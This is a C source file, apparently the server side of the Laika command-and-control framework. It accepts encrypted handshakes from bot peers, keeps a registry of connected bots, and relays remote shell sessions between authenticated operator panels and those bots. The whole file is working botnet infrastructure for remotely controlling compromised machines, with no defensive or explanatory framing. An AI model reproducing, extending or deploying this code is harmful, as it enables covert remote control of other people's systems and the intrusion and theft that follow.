#include "cnc.h"

#include "core/lerror.h"
#include "core/lmem.h"
#include "core/lsodium.h"
#include "core/ltask.h"
#include "cauth.h"
#include "cpeer.h"
#include "net/lsocket.h"

/* ======================================[[ PeerHashMap ]]======================================= */

typedef struct sCNC_PeerHashElem
{
    struct sLaika_peer *peer;
    uint8_t *pub;
} tCNC_PeerHashElem;

int cnc_PeerElemCompare(const void *a, const void *b, void *udata)
{
    const tCNC_PeerHashElem *ua = a;
    const tCNC_PeerHashElem *ub = b;

    return memcmp(ua->pub, ub->pub, crypto_kx_PUBLICKEYBYTES);
}

uint64_t cnc_PeerElemHash(const void *item, uint64_t seed0, uint64_t seed1)
{
    const tCNC_PeerHashElem *u = item;
    return *(uint64_t *)(u->pub); /* hashes pub key (first 8 bytes) */
}

/* ====================================[[ Packet Handlers ]]==================================== */

bool checkPeerKey(struct sLaika_peer *peer, void *uData)
{
    if (sodium_memcmp(peer->peerPub, uData, crypto_kx_PUBLICKEYBYTES) == 0)
        LAIKA_ERROR("public key is already in use!\n");

    return true;
}

void laikaC_handleHandshakeRequest(struct sLaika_peer *peer, LAIKAPKT_SIZE sz, void *uData)
{
    char magicBuf[LAIKA_MAGICLEN];
    struct sLaika_peerInfo *pInfo = (struct sLaika_peerInfo *)uData;
    struct sLaika_cnc *cnc = pInfo->cnc;
    char *tempIPBuf;
    uint8_t major, minor;

    laikaS_read(&peer->sock, (void *)magicBuf, LAIKA_MAGICLEN);
    major = laikaS_readByte(&peer->sock);
    minor = laikaS_readByte(&peer->sock);
    peer->osType = laikaS_readByte(&peer->sock);
    peer->type = PEER_BOT;

    if (memcmp(magicBuf, LAIKA_MAGIC, LAIKA_MAGICLEN) != 0 || major != LAIKA_VERSION_MAJOR ||
        minor != LAIKA_VERSION_MINOR)
        LAIKA_ERROR("invalid handshake request!\n");

    /* read peer's public key */
    laikaS_read(&peer->sock, peer->peerPub, sizeof(peer->peerPub));

    /* read hostname & inet */
    laikaS_read(&peer->sock, peer->hostname, LAIKA_HOSTNAME_LEN);
    laikaS_read(&peer->sock, peer->inet, LAIKA_INET_LEN);

    /* check and make sure there's not already a peer with the same key (might throw an LAIKA_ERROR,
     * which will kill the peer) */
    laikaC_iterPeers(cnc, checkPeerKey, (void *)peer->peerPub);

    /* restore null-terminator */
    peer->hostname[LAIKA_HOSTNAME_LEN - 1] = '\0';
    peer->inet[LAIKA_INET_LEN - 1] = '\0';

    /* gen session keys */
    if (crypto_kx_server_session_keys(peer->inKey, peer->outKey, cnc->pub, cnc->priv,
                                      peer->peerPub) != 0)
        LAIKA_ERROR("failed to gen session key!\n");

    /* encrypt all future packets */
    laikaS_setSecure(peer, true);

    /* queue response */
    laikaS_startOutPacket(peer, LAIKAPKT_HANDSHAKE_RES);
    laikaS_writeByte(&peer->sock, laikaM_isBigEndian());
    laikaS_write(&peer->sock, peer->salt, LAIKA_HANDSHAKE_SALT_LEN);
    laikaS_endOutPacket(peer);

    /* handshake (mostly) complete, we now wait for the PEER_LOGIN packets */
}

void laikaC_handlePing(struct sLaika_peer *peer, LAIKAPKT_SIZE sz, void *uData)
{
    struct sLaika_peerInfo *pInfo = (struct sLaika_peerInfo *)uData;

    pInfo->lastPing = laikaT_getTime();
    laikaS_emptyOutPacket(peer, LAIKAPKT_PINGPONG); /* gg 2 ez */
}

/* =====================================[[ Packet Tables ]]===================================== */

/* clang-format off */

#define DEFAULT_PKT_TBL \
    LAIKA_CREATE_PACKET_INFO(LAIKAPKT_HANDSHAKE_REQ, \
        laikaC_handleHandshakeRequest, \
        LAIKA_MAGICLEN + sizeof(uint8_t) + sizeof(uint8_t) + sizeof(uint8_t) + crypto_kx_PUBLICKEYBYTES + LAIKA_HOSTNAME_LEN + LAIKA_INET_LEN, \
    false), \
    LAIKA_CREATE_PACKET_INFO(LAIKAPKT_PINGPONG, \
        laikaC_handlePing, \
        0, \
    false), \
    LAIKA_CREATE_PACKET_INFO(LAIKAPKT_PEER_LOGIN_REQ, \
        laikaC_handlePeerLoginReq, \
        sizeof(uint8_t) + LAIKA_HANDSHAKE_SALT_LEN, \
    false)

struct sLaika_peerPacketInfo laikaC_peerPktTable[LAIKAPKT_MAXNONE] = {
    DEFAULT_PKT_TBL
};

struct sLaika_peerPacketInfo laikaC_botPktTbl[LAIKAPKT_MAXNONE] = {
    DEFAULT_PKT_TBL,
    LAIKA_CREATE_PACKET_INFO(LAIKAPKT_SHELL_CLOSE,
        laikaC_handleShellClose,
        sizeof(uint32_t),
    false),
    LAIKA_CREATE_PACKET_INFO(LAIKAPKT_SHELL_DATA,
        laikaC_handleShellData,
        sizeof(uint32_t), /* packet must be bigger than this */
    true),
};

struct sLaika_peerPacketInfo laikaC_authPktTbl[LAIKAPKT_MAXNONE] = {
    DEFAULT_PKT_TBL,
    LAIKA_CREATE_PACKET_INFO(LAIKAPKT_AUTHENTICATED_SHELL_OPEN_REQ,
        laikaC_handleAuthenticatedShellOpen,
        crypto_kx_PUBLICKEYBYTES + sizeof(uint16_t) + sizeof(uint16_t),
    false),
    LAIKA_CREATE_PACKET_INFO(LAIKAPKT_SHELL_CLOSE,
        laikaC_handleAuthenticatedShellClose,
        sizeof(uint32_t),
    false),
    LAIKA_CREATE_PACKET_INFO(LAIKAPKT_SHELL_DATA,
        laikaC_handleAuthenticatedShellData,
        sizeof(uint32_t), /* packet must be bigger than this */
    true),
};

#undef DEFAULT_PKT_TBL

/* clang-format on */

/* ==========================================[[ CNC ]]========================================== */

struct sLaika_cnc *laikaC_newCNC(uint16_t port)
{
    struct sLaika_cnc *cnc = laikaM_malloc(sizeof(struct sLaika_cnc));

    /* init peer hashmap & panel list */
    cnc->peers = hashmap_new(sizeof(tCNC_PeerHashElem), 8, 0, 0, cnc_PeerElemHash,
                             cnc_PeerElemCompare, NULL, NULL);
    laikaM_initVector(cnc->authPeers, 4);
    laikaM_initVector(cnc->authKeys, 4);
    cnc->port = port;

    /* init socket (we just need it for the raw socket fd and abstracted API :P) & pollList */
    laikaS_initSocket(&cnc->sock, NULL, NULL, NULL, NULL);
    laikaP_initPList(&cnc->pList);

    if (sodium_init() < 0) {
        laikaC_freeCNC(cnc);
        LAIKA_ERROR("LibSodium failed to initialize!\n");
    }

    /* load keys */
    LAIKA_DEBUG("using pubkey: %s\n", LAIKA_PUBKEY);
    if (!laikaK_loadKeys(cnc->pub, cnc->priv, LAIKA_PUBKEY, LAIKA_PRIVKEY)) {
        laikaC_freeCNC(cnc);
        LAIKA_ERROR("Failed to init cnc keypairs!\n");
    }

    laikaC_addAuthKey(cnc, LAIKA_PUBKEY);
    return cnc;
}

void laikaC_bindServer(struct sLaika_cnc *cnc)
{
    /* bind sock to port */
    laikaS_bind(&cnc->sock, cnc->port);

    /* add sock to pollList */
    laikaP_addSock(&cnc->pList, &cnc->sock);
}

void laikaC_freeCNC(struct sLaika_cnc *cnc)
{
    int i;

    laikaS_cleanSocket(&cnc->sock);
    laikaP_cleanPList(&cnc->pList);
    hashmap_free(cnc->peers);

    /* free auth keys */
    for (i = 0; i < laikaM_countVector(cnc->authKeys); i++) {
        laikaM_free(cnc->authKeys[i]);
    }
    laikaM_free(cnc->authKeys);
    laikaM_free(cnc);
}

void laikaC_onAddPeer(struct sLaika_cnc *cnc, struct sLaika_peer *peer)
{
    int i;

    /* add to peer lookup map */
    hashmap_set(cnc->peers, &(tCNC_PeerHashElem){.pub = peer->peerPub, .peer = peer});

    /* notify connected panels of the newly connected peer */
    for (i = 0; i < laikaM_countVector(cnc->authPeers); i++) {
        laikaC_sendNewPeer(cnc->authPeers[i], peer);
    }

    switch (peer->type) {
    case PEER_PEER:
        /* should never be reached */
        break;
    case PEER_BOT:
        /* TODO */
        break;
    case PEER_AUTH:
        /* add peer to panels list (if it's a panel) */
        laikaC_addAuth(cnc, peer);

        /* send a list of peers */
        laikaC_sendPeerList(cnc, peer);
        break;
    default:
        break;
    }

    GETPINFOFROMPEER(peer)->completeHandshake = true;
}

void laikaC_onRmvPeer(struct sLaika_cnc *cnc, struct sLaika_peer *peer)
{
    int i;

    /* ignore uninitalized peers */
    if (!(GETPINFOFROMPEER(peer)->completeHandshake))
        return;

    /* close any open shells */
    laikaC_closeShells(peer);
    switch (peer->type) {
    case PEER_PEER:
        /* should never be reached */
        break;
    case PEER_BOT:
        /* TODO */
        break;
    case PEER_AUTH:
        /* remove peer from panels list */
        laikaC_rmvAuth(cnc, peer);
        break;
    default:
        break;
    }

    /* notify connected panels of the disconnected peer */
    for (i = 0; i < laikaM_countVector(cnc->authPeers); i++) {
        laikaC_sendRmvPeer(cnc->authPeers[i], peer);
    }

    /* remove from peer lookup map */
    hashmap_delete(cnc->peers, &(tCNC_PeerHashElem){.pub = peer->peerPub, .peer = peer});
}

void laikaC_setPeerType(struct sLaika_cnc *cnc, struct sLaika_peer *peer, PEERTYPE type)
{
    /* make sure to update connected peers */
    laikaC_onRmvPeer(cnc, peer);

    /* free old peerInfo */
    laikaC_freePeerInfo(peer, peer->uData);

    /* update accepted packets */
    peer->type = type;
    switch (type) {
    case PEER_PEER:
        peer->packetTbl = laikaC_peerPktTable;
        peer->uData = laikaC_newPeerInfo(cnc);
        break;
    case PEER_AUTH:
        peer->packetTbl = laikaC_authPktTbl;
        peer->uData = laikaC_newAuthInfo(cnc);
        break;
    case PEER_BOT:
        peer->packetTbl = laikaC_botPktTbl;
        peer->uData = laikaC_newBotInfo(cnc);
        break;
    default:
        LAIKA_ERROR("laikaC_setPeerType: invalid peerType!\n");
        break;
    }

    /* a new (but not-so-new) peer has arrived */
    laikaC_onAddPeer(cnc, peer);
}

void laikaC_addAuth(struct sLaika_cnc *cnc, struct sLaika_peer *authPeer)
{
    /* grow array if we need to */
    laikaM_growVector(struct sLaika_peer *, cnc->authPeers, 1);

    /* insert into authenticated peer table */
    cnc->authPeers[laikaM_countVector(cnc->authPeers)++] = authPeer;

    LAIKA_DEBUG("added panel %p!\n", authPeer);
}

void laikaC_rmvAuth(struct sLaika_cnc *cnc, struct sLaika_peer *authPeer)
{
    int i;

    for (i = 0; i < laikaM_countVector(cnc->authPeers); i++) {
        if (cnc->authPeers[i] == authPeer) { /* we found the index for our panel! */
            laikaM_rmvVector(cnc->authPeers, i, 1);
            return;
        }
    }
}

void laikaC_addAuthKey(struct sLaika_cnc *cnc, const char *key)
{
    uint8_t *buf;
    laikaM_growVector(uint8_t *, cnc->authKeys, 1);

    buf = laikaM_malloc(crypto_kx_PUBLICKEYBYTES);
    if (!laikaK_loadKeys(buf, NULL, key, NULL))
        LAIKA_ERROR("Failed to load key '%s'\n", key);

    /* insert key */
    cnc->authKeys[laikaM_countVector(cnc->authKeys)++] = buf;
    printf("[~] Added authenticated public key '%s'\n", key);
}

void laikaC_killPeer(struct sLaika_cnc *cnc, struct sLaika_peer *peer)
{
    laikaC_onRmvPeer(cnc, peer);

    /* free peerInfo if it's defined */
    if (peer->uData)
        laikaC_freePeerInfo(peer, peer->uData);

    laikaP_rmvSock(&cnc->pList, (struct sLaika_socket *)peer);
    laikaS_freePeer(peer);

    LAIKA_DEBUG("peer %p killed!\n", peer);
}

/* socket event */
void laikaC_onPollFail(struct sLaika_socket *sock, void *uData)
{
    struct sLaika_peer *peer = (struct sLaika_peer *)sock;
    struct sLaika_cnc *cnc = (struct sLaika_cnc *)uData;
    laikaC_killPeer(cnc, peer);
}

bool laikaC_pollPeers(struct sLaika_cnc *cnc, int timeout)
{
    struct sLaika_peer *peer;
    struct sLaika_pollEvent *evnts, *evnt;
    int numEvents, i;

    laikaP_flushOutQueue(&cnc->pList);
    evnts = laikaP_poll(&cnc->pList, timeout, &numEvents);

    /* if we have 0 events, we reached the timeout, let the caller know */
    if (numEvents == 0) {
        return false;
    }

    /* walk through and handle each event */
    for (i = 0; i < numEvents; i++) {
        evnt = &evnts[i];
        if (evnt->sock == &cnc->sock) { /* event on listener? */
            peer = laikaS_newPeer(laikaC_peerPktTable, &cnc->pList, laikaC_onPollFail, cnc,
                                  (void *)laikaC_newPeerInfo(cnc));

            LAIKA_TRY
                /* setup and accept new peer */
                laikaS_acceptFrom(&peer->sock, &cnc->sock, peer->ipStr);
                laikaS_setNonBlock(&peer->sock);

                /* add to our pollList */
                laikaP_addSock(&cnc->pList, &peer->sock);

                LAIKA_DEBUG("new peer %p!\n", peer);
            LAIKA_CATCH
                /* acceptFrom() and setNonBlock() can fail */
                LAIKA_DEBUG("failed to accept peer %p!\n", peer);
                laikaS_freePeer(peer);
            LAIKA_TRYEND
            continue;
        }

        laikaP_handleEvent(evnt);
    }

    laikaP_flushOutQueue(&cnc->pList);
    return true;
}

struct sLaika_peer *laikaC_getPeerByPub(struct sLaika_cnc *cnc, uint8_t *pub)
{
    tCNC_PeerHashElem *elem =
        (tCNC_PeerHashElem *)hashmap_get(cnc->peers, &(tCNC_PeerHashElem){.pub = pub});

    return elem ? elem->peer : NULL;
}

void laikaC_sweepPeersTask(struct sLaika_taskService *service, struct sLaika_task *task,
                           clock_t currTick, void *uData)
{
    struct sLaika_cnc *cnc = (struct sLaika_cnc *)uData;
    struct sLaika_peer *peer;
    struct sLaika_peerInfo *pInfo;
    size_t i = 0;
    long currTime = laikaT_getTime();

    while (laikaC_iterPeersNext(cnc, &i, &peer)) {
        pInfo = GETPINFOFROMPEER(peer);

        /* peer has been silent for a while, kill 'em */
        if (currTime - pInfo->lastPing > LAIKA_PEER_TIMEOUT) {
            LAIKA_DEBUG("timeout reached for %p! [%ld]\n", peer, currTime);
            laikaC_killPeer(cnc, peer);

            /* reset peer iterator (since the hashmap mightve been reallocated/changed) */
            i = 0;
        }
    }
}

/* =======================================[[ Peer Iter ]]======================================= */

bool laikaC_iterPeersNext(struct sLaika_cnc *cnc, size_t *i, struct sLaika_peer **peer)
{
    tCNC_PeerHashElem *elem;

    if (hashmap_iter(cnc->peers, i, (void **)&elem)) {
        *peer = elem->peer;
        return true;
    }

    *peer = NULL;
    return false;
}

void laikaC_iterPeers(struct sLaika_cnc *cnc, tLaika_peerIter iter, void *uData)
{
    size_t i = 0;
    struct sLaika_peer *peer;

    /* call iter for every peer in cnc->peers */
    while (laikaC_iterPeersNext(cnc, &i, &peer))
        iter(peer, uData);
}
